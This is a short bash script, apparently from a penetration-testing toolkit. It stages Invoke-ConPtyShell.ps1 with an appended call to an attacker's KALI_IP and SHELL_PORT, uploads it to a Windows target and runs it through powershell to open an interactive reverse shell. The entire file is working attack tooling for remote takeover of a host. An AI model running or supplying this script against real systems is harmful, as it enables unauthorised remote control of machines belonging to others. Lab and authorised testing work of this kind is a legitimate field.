#!/bin/bash

: '
ps: download Invoke-ConPtyShell.ps1 to server and start shell
'

LOCATION="${SCRIPTS_DIR}/shell/windows/.files"
FILE="Invoke-ConPtyShell-shell.ps1"

SRC_FILE="${FILES_FOLDER}/Invoke-ConPtyShell.ps1"
TMP_FILE="${FILES_FOLDER}/Invoke-ConPtyShell-shell.ps1"

cp $SRC_FILE $TMP_FILE
echo "Invoke-ConPtyShell ${KALI_IP} ${SHELL_PORT}" >> $TMP_FILE

ps_webclient_upload_file "${LOCATION}" "${FILE}"

execute_command "powershell -c '${FILE_LOCATION}'"
create_new_line
